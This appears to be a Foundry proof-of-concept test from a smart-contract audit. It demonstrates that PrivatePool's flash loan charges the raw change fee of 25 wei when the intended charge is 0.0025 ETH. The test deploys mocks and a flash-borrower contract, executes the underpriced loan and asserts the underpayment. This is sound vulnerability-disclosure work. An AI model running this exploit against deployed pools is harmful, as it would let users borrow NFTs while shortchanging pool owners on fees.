// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PrivatePool} from "src/PrivatePool.sol";
import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashBorrower.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";

/// @notice Minimal mock Factory implementing the two functions used by PrivatePool
contract MockFactory {
    // 0% protocol fee to keep calculations simple
    function protocolFeeRate() external pure returns (uint16) {
        return 0;
    }

    // ownerOf is only used by _onlyOwner functions which are not touched in this test.
    function ownerOf(uint256) external pure returns (address) {
        return address(0);
    }
}

/// @notice Receiver contract used to take a flash-loaned NFT and approve it back to the pool.
contract FlashBorrower is IERC3156FlashBorrower {
    function onFlashLoan(
        address /*initiator*/,
        address token,
        uint256 tokenId,
        uint256 /*fee*/,
        bytes calldata /*data*/
    ) external override returns (bytes32) {
        // Approve the pool (msg.sender) to pull the NFT back.
        ERC721(token).approve(msg.sender, tokenId);
        // Return the selector expected by the pool implementation.
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Needed to receive ERC721 tokens safely.
    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract ExploitTest is Test {
    PrivatePool pool;
    MockERC721 nft;
    FlashBorrower borrower;

    // Constants for the test.
    uint256 constant TOKEN_ID = 1;
    uint56 constant CHANGE_FEE = 25; // Represents 0.0025 ETH for change(), but only 25 wei for flashLoan()

    function setUp() public {
        // Deploy mock NFT and mint a token to the test contract (attacker).
        nft = new MockERC721("Mock", "MOCK");
        nft.mint(address(this), TOKEN_ID);

        // Deploy a mock Factory.
        MockFactory factory = new MockFactory();

        // Deploy the pool implementation.
        pool = new PrivatePool(address(factory), address(0), address(0));

        // Initialize the pool with baseToken = ETH (address(0)). Other parameters are irrelevant for this test.
        pool.initialize(
            address(0), // baseToken = ETH
            address(nft),
            1e18, // virtualBaseTokenReserves (dummy)
            1e18, // virtualNftReserves (dummy)
            CHANGE_FEE, // changeFee (4-decimals fixed point)
            0, // feeRate
            bytes32(0), // merkleRoot (weights = 1e18)
            false, // useStolenNftOracle
            false // payRoyalties
        );

        // Transfer an NFT into the pool so it is available for flash loans.
        nft.safeTransferFrom(address(this), address(pool), TOKEN_ID);

        // Deploy the flash borrower contract.
        borrower = new FlashBorrower();
    }

    /// @notice Demonstrates that an attacker can borrow an NFT paying only 25 wei instead of the intended 0.0025 ETH fee.
    function testExploit_UnderpricedFlashLoanFee() public {
        // Sanity-check: flashFee returns raw changeFee value.
        assertEq(pool.flashFee(address(nft), TOKEN_ID), uint256(CHANGE_FEE));

        // The correctly scaled fee that should be charged (CHANGE_FEE * 10^14).
        uint256 expectedCorrectFee = uint256(CHANGE_FEE) * 10 ** 14; // 2.5e15 wei = 0.0025 ETH
        assertEq(expectedCorrectFee, 2_500_000_000_000_000); // explicit value for clarity

        // Give this contract enough ETH to cover any fee we expect to pay.
        vm.deal(address(this), 1 ether);
        // Record balance after funding to use as baseline.
        uint256 balanceBefore = address(this).balance;

        // Execute flash loan sending only the fee returned by flashFee() (25 wei).
        uint256 paidFee = pool.flashFee(address(nft), TOKEN_ID);
        pool.flashLoan{value: paidFee}(borrower, address(nft), TOKEN_ID, "");

        // Verify that only 25 wei were deducted from the initiator's balance.
        uint256 balanceAfter = address(this).balance;
        assertEq(balanceBefore - balanceAfter, paidFee, "Fee paid should only be 25 wei");

        // Ensure the pool once again owns the NFT at the end of the operation.
        assertEq(nft.ownerOf(TOKEN_ID), address(pool));
    }
}
